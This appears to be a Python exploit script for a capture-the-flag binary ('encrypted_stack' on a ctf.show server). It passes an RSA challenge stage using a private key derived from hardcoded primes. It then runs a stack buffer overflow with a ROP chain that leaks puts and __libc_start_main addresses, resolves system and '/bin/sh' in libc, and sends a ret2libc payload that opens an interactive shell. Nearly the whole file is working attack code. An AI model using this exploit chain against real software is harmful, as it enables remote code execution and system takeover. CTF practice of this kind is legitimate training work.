import gmpy2
import sgtlibc
from sgtlibc.gamebox import *
set_config(GameBoxConfig(
    is_local=False,
    file='./encrypted_stack',
    remote='pwn.challenge.ctf.show 28181',
    auto_load=True,
    auto_show_rop=True,
    auto_show_summary=True,
    auto_start_game=True,
    auto_load_shell_str=True,
    auto_show_symbols=True
))
s = sgtlibc.Searcher()
elf = client.elf

n = 94576960329497431
p = 361571773
q = 261571747
e = 65537
d = gmpy2.invert(e, (p-1)*(q-1))
ru('encrypt it\n')
for i in range(20):
    rand_num = rl()
    rand_num = rand_num.decode().strip('\n')
    rand_num = int(rand_num)
    # encrypted = pow(rand_num, e, n)
    decrypted = pow(rand_num, d, n)
    log.info(f'recv:{rand_num} , to:{decrypted}')
    sl(str(decrypted))
    rl()



payload_exp = [b'a' * 72]  # overflow position
main_addr = 0x0400B30 # elf.symbols['main']


def leak(func: str):
    log.warning(f'start leak {func}')
    payload = [payload_exp, elf.rop['rdi'], elf.got[func],
               elf.plt['puts'], main_addr]
    # 如果是read的话则sa，如果是gets scanf的话则sl
    # sla(b' input\n',payload)
    sa('you name:\n', payload)
    # ru('joke')
    # ru(fakeebp())  # 如果有输出则清空缓存

    data = rc(6).ljust(8, b'\0')
    log.info(f'data:{data}')
    data = u00(data)
    s.add_condition(func, data)
    return data


# leak('printf')
leak('puts')
# leak('stdout')
# leak('stdin')
leak('__libc_start_main')

# libc = ELF('libc_buu-2.23_x64.so', checksec=False)
# offset = addr - libc.symbols['__libc_start_main']
# system_addr = libc.symbols['system'] + offset
# binsh_addr = next(libc.search(b'/bin/sh')) + offset

data = s.dump(db_index=2)  # choose your system index
system_addr = s.get_address(sgtlibc.s_system)
binsh_addr = s.get_address(sgtlibc.s_binsh)
log.info(f'system_addr:{hex(system_addr)}')
log.info(f'binsh_addr:{hex(binsh_addr)}')
ret_addr = elf.search_string(b'\xc3')  # sometime maybe wrong
payload = [payload_exp, [ret_addr]*1]  # 栈平衡
payload += [elf.rop['rdi'], binsh_addr, system_addr]
sl(payload)
interactive()
